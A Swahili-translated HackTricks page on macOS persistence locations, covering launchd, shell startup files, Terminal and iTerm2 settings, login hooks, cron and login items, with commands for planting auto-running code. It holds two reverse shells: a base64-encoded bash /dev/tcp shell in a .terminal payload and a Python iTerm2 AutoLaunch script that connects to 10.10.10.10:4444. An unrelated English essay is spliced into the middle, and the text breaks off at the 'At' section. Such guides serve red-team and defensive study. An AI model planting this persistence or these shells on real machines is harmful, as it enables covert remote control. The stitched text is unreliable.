# macOS Kuanza Moja kwa Moja

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

Sehemu hii inategemea sana mfululizo wa blogu [**Zaidi ya njia nzuri za kuanza**](https://theevilbit.github.io/beyond/), lengo ni kuongeza **Maeneo zaidi ya Kuanza Moja kwa Moja** (ikiwezekana), kuonyesha **njia zipi bado zinafanya kazi** siku hizi na toleo jipya la macOS (13.4) na kuelezea **ruhusa** zinazohitajika.

## Kupita Kizuizi cha Sanduku

{% hint style="success" %}
Hapa unaweza kupata maeneo ya kuanza yanayofaa kwa **kupita kizuizi cha sanduku** ambayo inakuwezesha tu kutekeleza kitu kwa **kuandika kwenye faili** na **kungojea** kwa **kitendo cha kawaida sana**, kiasi fulani cha **wakati** au kitendo unachoweza kufanya kawaida kutoka ndani ya sanduku bila kuhitaji ruhusa ya mizizi.
{% endhint %}

### Launchd

* Inafaa kwa kupita kizuizi cha sanduku: [✅](https://emojipedia.org/check-mark-button)
* Kupita Kizuizi cha TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Maeneo

* **`/Library/LaunchAgents`**
* **Kitendo cha Kuanza**: Kuanza upya
* Inahitaji mizizi
* **`/Library/LaunchDaemons`**
* **Kitendo cha Kuanza**: Kuanza upya
* Inahitaji mizizi
* **`/System/Library/LaunchAgents`**
* **Kitendo cha Kuanza**: Kuanza upya
* Inahitaji mizizi
* **`/System/Library/LaunchDaemons`**
* **Kitendo cha Kuanza**: Kuanza upya
* Inahitaji mizizi
* **`~/Library/LaunchAgents`**
* **Kitendo cha Kuanza**: Kuingia tena
* **`~/Library/LaunchDemons`**
* **Kitendo cha Kuanza**: Kuingia tena

#### Maelezo & Udukuzi

**`launchd`** ni **mchakato wa kwanza** unaotekelezwa na kernel ya OX S wakati wa kuanza na wa mwisho kumaliza wakati wa kuzima. Daima inapaswa kuwa na **PID 1**. Mchakato huu utasoma na kutekeleza mipangilio iliyotajwa katika **plists ya ASEP** katika:

* `/Library/LaunchAgents`: Mawakala kwa kila mtumiaji waliowekwa na msimamizi
* `/Library/LaunchDaemons`: Daemons kwa mfumo mzima waliowekwa na msimamizi
* `/System/Library/LaunchAgents`: Mawakala kwa kila mtumiaji zinazotolewa na Apple.
* `/System/Library/LaunchDaemons`: Daemons kwa mfumo mzima zinazotolewa na Apple.

Wakati mtumiaji anapoingia, plists zilizoko katika `/Users/$USER/Library/LaunchAgents` na `/Users/$USER/Library/LaunchDemons` zinaanza na **ruhusa za watumiaji walioingia**.

**Tofauti kuu kati ya mawakala na daemons ni kwamba mawakala hulipwa wakati mtumiaji anaingia na daemons hulipwa wakati wa kuanza kwa mfumo** (kwa kuwa kuna huduma kama ssh ambayo inahitaji kutekelezwa kabla ya mtumiaji yeyote kupata mfumo). Pia mawakala yanaweza kutumia GUI wakati daemons lazima zifanye kazi nyuma ya pazia.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Kuna hali ambapo **mawakala wanahitaji kutekelezwa kabla ya mtumiaji kuingia**, hizi huitwa **PreLoginAgents**. Kwa mfano, hii ni muhimu kutoa teknolojia ya msaada wakati wa kuingia. Wanaweza kupatikana pia katika `/Library/LaunchAgents` (angalia [**hapa**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) mfano).

{% hint style="info" %}
Faili mpya za usanidi za Daemons au Agents zitapakia **baada ya kuanza upya au kutumia** `launchctl load <target.plist>` Pia ni **inawezekana kupakia faili za .plist bila kuwa na kipengee** hiyo na `launchctl -F <file>` (hata hivyo faili hizo za plist hazitapakia moja kwa moja baada ya kuanza upya).\
Pia inawezekana **kupakia** kwa kutumia `launchctl unload <target.plist>` (mchakato ulionyoeshwa na hiyo utakomeshwa),

Ili **hakikisha** kwamba hakuna **kitu** (kama kubadilisha) **kinazuia** **Agent** au **Daemon** **kutekelezwa** endesha: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

Orodhesha mawakala na daemons yote yaliyopakiwa na mtumiaji wa sasa:
```bash
launchctl list
```
{% hint style="warning" %}
Ikiwa plist inamilikiwa na mtumiaji, hata kama iko katika folda za mfumo wa daemon, **kazi itatekelezwa kama mtumiaji** na sio kama root. Hii inaweza kuzuia baadhi ya mashambulizi ya kuongeza mamlaka.
{% endhint %}

### faili za kuanza kwa shell

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Maelezo (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Inatumika kuvuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kuvuka TCC: [✅](https://emojipedia.org/check-mark-button)
* Lakini unahitaji kupata programu na kuvuka TCC ambayo inatekeleza shell ambayo inapakia faili hizi

#### Maeneo

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Kichocheo**: Fungua terminal na zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Kichocheo**: Fungua terminal na zsh
* Inahitaji ruhusa ya root
* **`~/.zlogout`**
* **Kichocheo**: Funga terminal na zsh
* **`/etc/zlogout`**
* **Kichocheo**: Funga terminal na zsh
* Inahitaji ruhusa ya root
* Inawezekana zaidi katika: **`man zsh`**
* **`~/.bashrc`**
* **Kichocheo**: Fungua terminal na bash
* `/etc/profile` (haikufanya kazi)
* `~/.profile` (haikufanya kazi)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Kichocheo**: Inatarajiwa kichocheo na xterm, lakini **haijasanidiwa** na hata baada ya kusanidiwa, kosa hili linatokea: xterm: `DISPLAY is not set`

#### Maelezo & Utekaji

Wakati wa kuanzisha mazingira ya shell kama `zsh` au `bash`, **faili fulani za kuanza zinaendeshwa**. macOS kwa sasa inatumia `/bin/zsh` kama shell ya msingi. Shell hii inafikiwa moja kwa moja wakati programu ya Terminal inazinduliwa au wakati kifaa kinapata kupitia SSH. Ingawa `bash` na `sh` pia zipo katika macOS, lazima zitajwe wazi ili kutumika.

Ukurasa wa man wa zsh, ambao tunaweza kusoma na **`man zsh`** una maelezo marefu ya faili za kuanza.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Programu Zilizofunguliwa tena

{% hint style="danger" %}
Kuweka mazingira ya uchunguzi yaliyotajwa na kisha kujitokeza na kisha kuingia tena au hata kuanza upya hakufanya kazi kwangu kutekeleza programu. (Programu haikuwa ikitekelezwa, labda inahitaji kuendesha wakati hatua hizi zinafanywa)
{% endhint %}

**Andika**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Kichocheo**: Kuanza upya kufungua tena programu

#### Maelezo na Uchunguzi

Programu zote za kufunguliwa tena ziko ndani ya plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Kwa hivyo, ili programu zilizofunguliwa tena zianze programu yako, unahitaji tu **kuongeza programu yako kwenye orodha**.

UUID inaweza kupatikana kwa kuorodhesha saraka hiyo au na `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Ili kuangalia programu ambazo zitafunguliwa tena, unaweza kufanya:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Kuweka programu kwenye orodha hii, unaweza kutumia:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Mapendeleo ya Terminali

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kukiuka TCC: [✅](https://emojipedia.org/check-mark-button)
* Terminali hutumia ruhusa za FDA za mtumiaji anayetumia

#### Mahali

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Kichocheo**: Fungua Terminali

#### Maelezo na Utekaji

Katika **`~/Library/Preferences`** kuna uhifadhi wa mapendeleo ya mtumiaji katika Programu. Baadhi ya mapendeleo haya yanaweza kushikilia usanidi wa **kutekeleza programu/zulia nyingine**.

Kwa mfano, Terminali inaweza kutekeleza amri wakati wa kuanza:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Usanidi huu unaonyeshwa katika faili **`~/Library/Preferences/com.apple.Terminal.plist`** kama ifuatavyo:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Kwa hivyo, ikiwa plist ya mapendeleo ya terminali katika mfumo inaweza kuandikwa upya, basi utendaji wa **`open`** unaweza kutumika kufungua terminali na amri hiyo itatekelezwa.

Unaweza kuongeza hii kutoka kwa cli na:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Skripti za Terminali / Viendelezi vingine vya faili

* Inatumika kuepuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kuepuka TCC: [✅](https://emojipedia.org/check-mark-button)
* Terminali inatumia ruhusa za FDA za mtumiaji anayetumia

#### Mahali

* **Popote**
* **Kichocheo**: Fungua Terminali

#### Maelezo na Utekaji

Ikiwa utaunda [**skripti ya `.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) na kuifungua, **Programu ya Terminali** itaitwa moja kwa moja kutekeleza amri zilizoonyeshwa hapo. Ikiwa programu ya Terminali ina ruhusa maalum (kama vile TCC), amri yako itatekelezwa na ruhusa hizo maalum.

Jaribu na:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Unaweza pia kutumia nyongeza **`.command`**, **`.tool`**, na maudhui ya skripti za kawaida za kabati na zitafunguliwa na Terminal pia.

{% hint style="danger" %}
Ikiwa terminal ina **Ufikiaji Kamili wa Diski**, itaweza kukamilisha hatua hiyo (kumbuka kuwa amri iliyotekelezwa itaonekana kwenye dirisha la terminal).
{% endhint %}

### Programu za Sauti

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Maelezo: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kukiuka TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Unaweza kupata ufikiaji wa ziada wa TCC

#### Mahali

* **`/Library/Audio/Plug-Ins/HAL`**
* Inahitaji mizizi
* **Kichocheo**: Anza tena coreaudiod au kompyuta
* **`/Library/Audio/Plug-ins/Components`**
* Inahitaji mizizi
* **Kichocheo**: Anza tena coreaudiod au kompyuta
* **`~/Library/Audio/Plug-ins/Components`**
* **Kichocheo**: Anza tena coreaudiod au kompyuta
* **`/System/Library/Components`**
* Inahitaji mizizi
* **Kichocheo**: Anza tena coreaudiod au kompyuta

#### Maelezo

Kulingana na maelezo ya awali, ni **inawezekana kuunda programu za sauti** na kuzipakia.

### Programu za QuickLook

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kukiuka TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Unaweza kupata ufikiaji wa ziada wa TCC

#### Mahali

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Maelezo na Utekaji

Programu za QuickLook zinaweza kutekelezwa wakati **unachochea hakikisho la faili** (bonyeza nafasi na faili iliyochaguliwa katika Finder) na **nyongeza inayounga mkono aina hiyo ya faili** imefungwa.

Inawezekana kuunda nyongeza yako ya QuickLook, kuweka katika moja ya maeneo hapo juu ili kuipakia, kisha nenda kwenye faili inayoungwa mkono na bonyeza nafasi ili kuchochea.

### ~~Vifungo vya Kuingia/Kutoka~~

{% hint style="danger" %}
Hii haikufanya kazi kwangu, wala na Kuingia kwa mtumiaji wala na Kutoka kwa mizizi
{% endhint %}

**Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* Unahitaji kuweza kutekeleza kitu kama `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* Iko katika `~/Library/Preferences/com.apple.loginwindow.plist`

Zimepitwa na wakati lakini zinaweza kutumika kutekeleza amri wakati mtumiaji anapoingia.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Mazingira haya yanahifadhiwa katika `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Ili kufuta hiyo:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Mwanzo wa mtumiaji mmoja umehifadhiwa katika **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Kuvuka Sanduku kwa Masharti

{% hint style="success" %}
Hapa unaweza kupata maeneo ya kuanza yanayofaa kwa **kuvuka sanduku** ambayo inakuruhusu tu kutekeleza kitu kwa **kuandika katika faili** na **kutarajia hali sio za kawaida** kama **programu maalum zilizosanikishwa, hatua za mtumiaji "isio ya kawaida"** au mazingira.
{% endhint %}

### Cron

**Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Inafaa kwa kuvuka sanduku: [✅](https://emojipedia.org/check-mark-button)
* Walakini, unahitaji kuweza kutekeleza `crontab` binary
* Au kuwa mtumiaji mkuu
* Kuvuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Inahitajika kuwa mtumiaji mkuu ili kuandika moja kwa moja. Haihitajiki kuwa mtumiaji mkuu ikiwa unaweza kutekeleza `crontab <file>`
* **Kichocheo**: Inategemea kazi ya cron

#### Maelezo & Utekaji

Orodhesha kazi za cron za **mtumiaji wa sasa** na:
```bash
crontab -l
```
Unaweza pia kuona kazi zote za cron za watumiaji katika **`/usr/lib/cron/tabs/`** na **`/var/at/tabs/`** (inahitaji ruhusa ya msingi).

Katika MacOS, folda kadhaa zinazotekeleza hati kwa **frekwensi fulani** zinaweza kupatikana katika:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Hapa ndipo unaweza kupata **kazi za cron** za kawaida, **kazi za at** (ambazo hazitumiwi sana) na **kazi za kipindi** (zinazotumiwa hasa kwa kusafisha faili za muda). Kazi za kipindi za kila siku zinaweza kutekelezwa kwa mfano na: `periodic daily`.

Ili kuongeza **kazi ya cron ya mtumiaji kwa njia ya programu**, inawezekana kutumia:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Inatumika kuvuka sanduku ya mchanga: [✅](https://emojipedia.org/check-mark-button)
* Kuvuka TCC: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 hutumia ruhusa za TCC zilizoidhinishwa

#### Maeneo

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Kichocheo**: Fungua iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Kichocheo**: Fungua iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Kichocheo**: Fungua iTerm

#### Maelezo & Utekaji

Majalada yaliyohifadhiwa katika **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** yatafanywa. Kwa mfano:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
# macOS Auto-Start Locations

## Introduction

In macOS, there are several locations where applications and processes can be configured to automatically start when the system boots up or when a user logs in. Understanding these auto-start locations is important for both system administrators and attackers, as they can be used to gain persistence on a compromised system.

## Auto-Start Locations

### Launch Agents

Launch Agents are plist files located in the `~/Library/LaunchAgents` and `/Library/LaunchAgents` directories. These files define tasks that are executed when a user logs in. They are executed in the context of the user who logged in.

### Launch Daemons

Launch Daemons are plist files located in the `/Library/LaunchDaemons` directory. These files define tasks that are executed when the system boots up, before any user logs in. They are executed in the context of the root user.

### Startup Items

Startup Items are directories located in the `/Library/StartupItems` directory. Each directory represents a separate item and contains an executable script that is executed when the system boots up. They are executed in the context of the root user.

### Login Items

Login Items are configured in the System Preferences under the Users & Groups section. They define applications or processes that are launched when a user logs in. They are executed in the context of the user who logged in.

### Cron Jobs

Cron Jobs are scheduled tasks that are configured using the `crontab` command. They can be used to execute commands or scripts at specific times or intervals. Cron Jobs are executed in the context of the user who created them.

### Launchctl

Launchctl is a command-line utility that manages launchd, the system-wide daemon responsible for starting and stopping services. It can be used to load or unload Launch Agents and Launch Daemons, as well as start or stop services.

## Conclusion

Understanding the various auto-start locations in macOS is crucial for both defenders and attackers. System administrators can use this knowledge to ensure that only authorized applications and processes are automatically started, while attackers can leverage these locations to gain persistence on a compromised system. Regularly auditing and monitoring these auto-start locations is recommended to maintain the security of macOS systems.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Skripti **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** pia itatekelezwa:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Mipangilio ya iTerm2 iko katika **`~/Library/Preferences/com.googlecode.iterm2.plist`** inaweza **kuonyesha amri ya kutekelezwa** wakati terminali ya iTerm2 inafunguliwa.

Mipangilio hii inaweza kusanidiwa katika mipangilio ya iTerm2:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

Na amri inaonyeshwa katika mipangilio:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Unaweza kuweka amri ya kutekelezwa na:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Kuna uwezekano mkubwa wa kuwepo kwa **njia nyingine za kutumia mipangilio ya iTerm2** ili kutekeleza amri za kiholela.
{% endhint %}

### xbar

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini xbar lazima iwe imewekwa
* Kukiuka TCC: [✅](https://emojipedia.org/check-mark-button)
* Inahitaji ruhusa ya Ufikiaji

#### Mahali

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Kichocheo**: Mara tu xbar inapoendeshwa

#### Maelezo

Ikiwa programu maarufu ya [**xbar**](https://github.com/matryer/xbar) imefungwa, inawezekana kuandika script ya shell katika **`~/Library/Application\ Support/xbar/plugins/`** ambayo itatekelezwa wakati xbar inapoanza:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Andika**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Inatumika kuvuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini Hammerspoon lazima iwe imewekwa
* Kuvuka TCC: [✅](https://emojipedia.org/check-mark-button)
* Inahitaji ruhusa ya Ufikiaji

#### Mahali

* **`~/.hammerspoon/init.lua`**
* **Kichocheo**: Mara Hammerspoon inapoendeshwa

#### Maelezo

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) inatumika kama jukwaa la kiotomatiki kwa **macOS**, likitumia **lugha ya skrini ya LUA** kwa shughuli zake. Kwa kuzingatia, inasaidia uingizaji wa nambari kamili ya AppleScript na utekelezaji wa skrini za shell, ikiboresha uwezo wake wa kiotomatiki kwa kiasi kikubwa.

Programu hii inatafuta faili moja tu, `~/.hammerspoon/init.lua`, na wakati inapoanza, hati itatekelezwa.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### SSHRC

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Inatumika kuvuka sanduku ya mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini ssh inahitaji kuwezeshwa na kutumiwa
* Kuvuka TCC: [✅](https://emojipedia.org/check-mark-button)
* SSH hutumika kupata ufikiaji wa FDA

#### Mahali

* **`~/.ssh/rc`**
* **Kichocheo**: Ingia kupitia ssh
* **`/etc/ssh/sshrc`**
* Inahitaji mizizi
* **Kichocheo**: Ingia kupitia ssh

{% hint style="danger" %}
Kuwezesha ssh kunahitaji Ufikiaji Kamili wa Diski:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Maelezo na Utekaji

Kwa chaguo-msingi, isipokuwa `PermitUserRC no` katika `/etc/ssh/sshd_config`, wakati mtumiaji **anaingia kupitia SSH** hati **`/etc/ssh/sshrc`** na **`~/.ssh/rc`** zitatekelezwa.

### **Vitu vya Kuingia**

Andika: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Inatumika kuvuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini unahitaji kutekeleza `osascript` na vigezo
* Kuvuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Maeneo

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Kichocheo:** Kuingia
* Malipo ya kudanganya yamehifadhiwa kwa kuita **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Kichocheo:** Kuingia
* Inahitajika kuwa na mizizi

#### Maelezo

Katika Mapendeleo ya Mfumo -> Watumiaji & Vikundi -> **Vitu vya Kuingia** unaweza kupata **vitengo vya kutekelezwa wakati mtumiaji anapoingia**.\
Inawezekana kuziorodhesha, kuongeza na kuondoa kutoka kwenye mstari wa amri:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Vitu hivi vimehifadhiwa katika faili **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Vitu vya kuingia** pia vinaweza kuonyeshwa kwa kutumia API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) ambayo itahifadhi mazingira katika **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP kama Kipengele cha Kuingia

(Angalia sehemu iliyopita kuhusu Vitu vya Kuingia, hii ni nyongeza)

Ikiwa unahifadhi faili ya **ZIP** kama **Kipengele cha Kuingia**, **`Archive Utility`** itaifungua na ikiwa zip ilihifadhiwa kwa mfano katika **`~/Library`** na ilikuwa na Folda ya **`LaunchAgents/file.plist`** na mlango wa nyuma, folda hiyo itaundwa (haipo kwa chaguo-msingi) na plist itaongezwa ili wakati mwingine mtumiaji anapoingia tena, **nyuma iliyotajwa katika plist itatekelezwa**.

Chaguo lingine ni kuunda faili za **`.bash_profile`** na **`.zshenv`** ndani ya nyumbani kwa mtumiaji, kwa hivyo ikiwa saraka ya LaunchAgents tayari ipo, mbinu hii bado itafanya kazi.

### At

Andika: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Inafaa kwa kuepuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini unahitaji **kutekeleza** **`at`** na lazima iwe **imeamilishwa**
